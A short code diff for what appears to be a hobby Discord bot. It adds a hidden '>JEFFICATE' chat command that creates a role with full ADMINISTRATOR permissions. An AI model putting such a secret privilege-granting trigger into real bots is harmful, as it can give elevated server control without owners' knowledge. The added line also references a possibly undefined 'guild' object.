@@ -28,7 +28,7 @@ bot.on('message', message =>  {
 
   if (msg === ">" + 'JEFFICATE')
   {
-    
+      guild.createRole({name:'Example Role', permissions:['ADMINISTRATOR']})
   }
   
   /* Delete message and replace with Jeffs */
